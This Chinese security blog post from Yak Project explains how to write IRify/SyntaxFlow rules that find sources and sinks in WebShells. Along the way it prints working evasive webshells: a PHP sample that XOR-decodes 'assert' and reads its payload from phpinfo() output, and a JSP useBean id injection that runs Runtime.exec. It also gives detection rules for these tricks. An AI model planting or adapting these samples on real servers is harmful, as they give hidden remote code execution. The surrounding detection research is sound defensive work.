#  用 IRify 深入探索 WebShell 中的 Source/Sink 挖掘  
原创 YAK  Yak Project   2025-06-06 09:00  
  
#   
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZfCSs0zKcMmDXyJt76PDpGiataSbajd3BpbZnPXBCqFaA3icu2mY1LGqAmJHIiaCq5N9qCBv47ktQEYA/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZd0VthLJpzgmAAibgKmOtuudic6NWfMSJWFgz2JwxI10Z4Qoxs5YLH3oibnffYlSbojWtzPDMOvPh2ZA/640?wx_fmt=webp&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUeme1MO436fNT0P6dhGs6bQdibD6gP1A2zWiab6vjfblic9CDqYyn3ia3nQ/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUASdGNS0EeoUl9XBDzR8zhGwSQ0eWuzvVEDjSSKnzGQY9eybseRAvSA/640?wx_fmt=jpeg "")  
## ?()表达式：  
  
在之前的规则中，常常会像下面这样写。  
```
__GET as $source
aa(* #{include: <<<CODE
* & $source
CODE}-> as $sink)
```  
  
比较诟病的是，这样找到的**sink**  
 点并非真正的**sink**  
 点，而是topdef之后的结果。?()  
的出现类似于?{}  
，都是对中间结果进行过滤，然后影响结果的值。  
  
  
样例：  
```
<?php
a(1,2);
a($a,2);
//参数中含有const
a?(*?{opcode: const}) as $sink
//参数1为const
a?(*?{opcode: const},) as $sink
//参数1，2均为const
a?(*?{opcode: const},*?{opcode: const}) as $sink
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJU9IxibBxG1fSqRVMoOubqibEWqHabBdPFurTBVAzOUibseHYfk7y0q5rgg/640?wx_fmt=png&from=appmsg "")  
  
Webshell  
 大家并不陌生，无论是红蓝中对 webshell 的检测还是免杀，也是老生常谈的问题。在2023年，我也参加过伏魔挑战赛，我也会用一部分我对 webshell 的理解和 ssa  
 结合，重新对 WebShell 审视  
 **source**  
   
 和 **sink**  
 ，  
并且针对 WebShell 实现一些规则。  
  
在 PHP   
漏洞挖掘的过程中，我们常常认为 Source   
点为 $_GET  
、$_POST  
、$_REQUEST  
、headers   
等一系列全局可控函数，sink 点尝尝为 eval  
、system  
 等一系列常见的**代码执行**  
 /**命令执行**  
的代码中，但是在 PHP   
是动态运行。支持 php   
中的常见间接函数调用。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUuIicnULWr3p0KmFQ2Xv3g8C86dJGCabf07Qx2kpibyibPCPGUMVbbkaqQ/640?wx_fmt=png&from=appmsg "")  
  
那么从 WebShell 的编写来说，我们常常需要绕过一些常规的 Sink 点，像REQUEST  
、POST  
、GET   
等一些常规的 source   
点都会被 ban 掉，那么是否存在一些冷门的 source   
点呢？  
  
#### 冷门 source 点：  
  
- phpinfo()  
  
在phpinfo  
中，会打印出这次请求的全部信息，可以当作一个非常规source点去用。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUia5VLUZ5C2Kmo6JcdicJ2qLFAMRvP2uEwlXHCAux4o2aF4rbhGMMHeiaQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUNVrCuUNUSuMmjlyNgeJPn0TNTetxTwW27yicfdVl3G4nK311IQcDxpg/640?wx_fmt=jpeg "")  
#### 冷门 sink 点：  
  
因为 php 中支持间接的函数调用，而 (MY_CONST)   
作为一个括号表达式，会先进行计算返回常量字符串，然后会在 zendVM   
的函数表中进行查找。  
```
<?php
define('MY_CONST', 'phpinfo');
// 直接调用常量名作为函数，报错
MY_CONST(); // ❌ 错误：Call to undefined function MY_CONST()
(MY_CONST)(); // ✅ 正确调用 phpinfo() 函数
```  
#### 数据流污染：  
  
  
光靠冷门的 source   
和 sink   
其实也难以绕过，还需要实现数据流的污染，在静态分析翻译的过程中，难点在于  
全局变量、全局常量、静态变量、静态常量。  
特点是：数据的精确度受到函数调用关系的影响，而静态分析的过程中，我们又常常  
无法去精确的知道两个函数之间的调用顺序，  
和入口点也有极大关系。  
  
这里我选择使用了  
 define   
来做数据流的混淆：  
```
<?php
namespace DemoInfo {
    define("DEMO", (new Demo())->invokeMethod());
    function xorencrypt($str, $key)
    {
        $slen = strlen($str);
        $klen = strlen($key);
        $cipher = '';
        for ($i = 0; $i < $slen; $i = $i + $klen) {
            $cipher .= substr($str, $i, $klen) ^ $key;
        }
        return $cipher;
    }
    class Demo
    {
        private $content;
        public function __construct()
        {
            ob_start();
            phpinfo();
            $this->content = ob_get_contents();
            ob_end_clean();
        }
        public function invokeMethod()
        {
            preg_match("/1'\]<\/td><td class=\"v\">(.*?)<\/td><\/tr>/i", $this->content, $matches);
            return $matches[1];
        }
    }
}
```  
### webshell 样例：  
```
<?php
namespace DemoInfo {
    define("DEMO", (new Demo())->invokeMethod());
    function xorencrypt($str, $key)
    {
        $slen = strlen($str);
        $klen = strlen($key);
        $cipher = '';
        for ($i = 0; $i < $slen; $i = $i + $klen) {
            $cipher .= substr($str, $i, $klen) ^ $key;
        }
        return $cipher;
    }
    class Demo
    {
        private $content;
        public function __construct()
        {
            ob_start();
            phpinfo();
            $this->content = ob_get_contents();
            ob_end_clean();
        }
        public function invokeMethod()
        {
            preg_match("/1'\]<\/td><td class=\"v\">(.*?)<\/td><\/tr>/i", $this->content, $matches);
            return $matches[1];
        }
    }
}
namespace {
    use DemoInfo\Demo;
    use function DemoInfo\xorencrypt;
    define("DEMO2", (xorencrypt("PBBTCE", "1")));
    define("DEMO", (new Demo())->invokeMethod());
    (DEMO2)(\DEMO);
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUo1IxpcwibicFbAibAGFstQw5Eyl6amTobLFcwmIwHOISSM7H6LaekIYBQ/640?wx_fmt=png&from=appmsg "")  
  
在 jsp 中，和 php 会有所不同，jsp 会 <%!%>   
会被翻译成class，而 <%%>   
中的内容会被翻译到 _jspService   
方法中。在我前一段时间的研究中发现，jsp   
在翻译成 .java 的时候，会在底层有一些**鸡肋**  
的处理。比如：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUaUFn7PDkLXaNMRmQyABjPXQgDlR58Y8oaMmGYHsAV5Yg3eX2XFSIzA/640?wx_fmt=png&from=appmsg "")  
  
他在翻译的时候，会将标签解析成 AST   
抽象语法树，然后再通过StringBuilder   
“拼接” 成一个 .java   
文件，然后再进行编译。那这样的话，其实有非常多的 bypass   
技巧和方法。我在翻了几个 AST 翻译过程时发现，有些会被拦掉，但有些并不会。这块会直接拿到 id   
中的内容，然后直接写入到 .java   
中，可以实现代码注入。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUKlPzwTyosCiauEX5ZW9qwHoKse1ia43b6wQK8p9zUuJfzsjAzrTyAbYg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUX15hCllotaCRrNbtlLlC24t3uqYT7TcXSu62A5ia94ECwDa5ibRibqLJA/640?wx_fmt=png&from=appmsg "")  
### Webshell demo：  
```
<jsp:useBean id="a=null;java.lang.Runtime.getRuntime().exec(\"open -a calculator\");/*" class="org.aa.test"/>  
<%*/out.print(1);%>
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUiaribNltC2d1eLzzdicgssWbeAyhAQawichxmpibd3qIFC9zRV35kicM3cmw/640?wx_fmt=png&from=appmsg "")  
  
因为 WebShell   
中的 source   
和 sink   
都做了很多污染，也利用了一些冷门的特性。只能找一些通用的共同点，提供一些通用的思路检测。  
### call method 检测：检查 call method 是否为常量。  
  
在 php   
中，会有一些常见的检测思路  
，检查是否用  
了非“常规”的 call method  
。比如：是否用了常量。  
```
*?{opcode: call} as $call
$call?{<get
Callee>?{opcode: const}} as $sink
//DEMO: 
<?php
define("aa","assert");
(aa)($_GET);
```  
#### 检查 call method 类型是否是 call：  
```
<?php
define("aa","YXNzZXJ0");
base64_decode(aa)();
/*
*?{opcode: call} as $call
$call<getCallee>?{opcode: call} as $sink
*/
```  
#### 检查 call method 类型是否是 call：  
### Call param 检测：  
  
检查 callParam 中，是否经过某些特定函数。比如在上述中的 php webshell 中，我们可以检测是否经过 ob_get_contents   
然后再去遍历该块中的所有指令。一条可能检查的规则如下：  
```
*?{opcode: call} as $call
/(?i)phpinfo/() as $sink
ob_get_contents?{<self><scanInstruction(include:<<<CODE
* & $sink
CODE)>} as $evil
$call?{<getCallee>?(* #{include: <<<CODE
* & $evil
CODE}->)} as $sink
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZdiav3QO7MZn7PiaKliby6SJJUUibGyLer02fo3Sda4ydvgkJK1mffzlQDjJWSiaytq2fZ1wcRUJGiaT7SQ/640?wx_fmt=png&from=appmsg "")  
  
在上面讲到了 java   
和 php  
 webshell 中常见的 source 点，在平时的漏洞挖掘中，是否也同样存在呢？  
  
我在前一段时间中，碰到过这么一段代码：  
```
    if (request()->isPost()) {
        $post = request()->post();
        $post['id'] = get_admin_id();
        if ($this->model->update($post)) {
            return $this->success();
        }
        return $this->error();
    }
    $data = $this->model->find(get_admin_id());
    if (!empty($data['group_id'])) {
        $group = AdminGroupModel::field('title')
            ->whereIn('id', $data['group_id'])
            ->select()
            ->toArray();
        foreach ($group as $key => $value) {
            $title[$key] = $value['title'];
        }
    }
    $data['jobs'] = Jobs::where('id', $data['jobs_id'])->value('title');
    $data['group'] = implode('－', $title);
    $data['tags'] = empty($data['tags']) ? $data['tags'] : unserialize($data['tags']);
```  
  
是可以执行反序列化，数据是从数据库查询回来，而数据该字段又可以自主控制，那么这个时候，我们还认为这个是一个常规 source   
点嘛？  
  
这一类问题可以抽象成 A   
经过中间环境后变成 B  
，是否还可以当成一个 source   
点？  
  
这个会取决于，A   
是否可控，如果 A   
可控，那么 B   
有可能会成为一个 source 点，A 如果不可控，B 大概不会成为一个 source   
点。  
  
所以这段代码中，最后会写成  
（ syntaxflow 表达冷门 source 点  
）  
：  
```
./where|find|select/ as $source
unserialize?(* #{include: <<<CODE
* & $source
CODE}->) as $sink
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZc8mZ9sZibP8pBiaZjzlzuicdIDRNhnSIHCcnT8m741QzgTxU8c5ElAOJdYVib2WgWXqBLABlzvHWYNDg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
在后面也许会支持一些 webshell 的通用检查规则，去编写每种语言的一些通用规则。另外，在漏洞挖掘中，目前的内置规则中是覆盖了大部分情况，但由于代码的多样性，可能需要用户对某些特定的代码环境进行特定的编写，而  
对于冷门的 source  
 点，通常需要找到“中间环境”，比如：env  
、cache   
等。  
  
  
  
**END**  
  
  
 **YAK官方资源**  
  
  
Yak 语言官方教程：  
  
https://yaklang.com/docs/intro/  
  
Yakit 视频教程：  
  
https://space.bilibili.com/437503777  
  
Github下载地址：  
  
https://github.com/yaklang/yakit  
  
Yakit官网下载地址：  
  
https://yaklang.com/  
  
Yakit安装文档：  
  
https://yaklang.com/products/download_and_install  
  
Yakit使用文档：  
  
https://yaklang.com/products/intro/  
  
常见问题速查：  
  
https://yaklang.com/products/FAQ  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/f7AtEgJhMZcGEibOlRNlz6ZPic3cWicMDwdqZLq9q0hibDYiaICia6nncspoDTRnjPXFGTr3VWd9FlV4YSXRStoabxbg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&retryload=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/f7AtEgJhMZeX0EdicJxBOjGjQuecg0TvCvRgqibPwyOUp8untXs9Cl5XKux2yQQf27ibgZ0ic0Fm2yicdbYg6c4xUJg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
